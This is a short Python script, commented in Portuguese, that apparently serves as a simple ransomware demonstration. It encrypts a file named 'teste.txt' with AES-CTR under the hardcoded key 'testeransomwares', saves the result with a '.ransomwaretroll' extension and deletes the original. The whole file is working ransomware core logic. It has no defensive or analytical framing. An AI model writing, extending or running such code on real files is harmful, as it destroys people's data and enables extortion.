import os
import pyaes

def criptografar_arquivo(file_name, chave):
    try:
        # Abrir o arquivo a ser criptografado
        with open(file_name, "rb") as file:
            file_data = file.read()
        
        # Criptografar o arquivo
        aes = pyaes.AESModeOfOperationCTR(chave)
        crypto_data = aes.encrypt(file_data)
        
        # Salvar o arquivo criptografado
        new_file_name = file_name + ".ransomwaretroll"
        with open(new_file_name, 'wb') as new_file:
            new_file.write(crypto_data)
        
        # Remover o arquivo original após criptografia bem-sucedida
        os.remove(file_name)
        print(f"Arquivo criptografado com sucesso: {new_file_name}")
    
    except FileNotFoundError:
        print(f"Erro: O arquivo {file_name} não foi encontrado.")
    
    except Exception as e:
        print(f"Ocorreu um erro durante a criptografia: {e}")

# Chave de criptografia
chave = b"testeransomwares"

# Nome do arquivo a ser criptografado
file_name = "teste.txt"

# Criptografar o arquivo
criptografar_arquivo(file_name, chave)
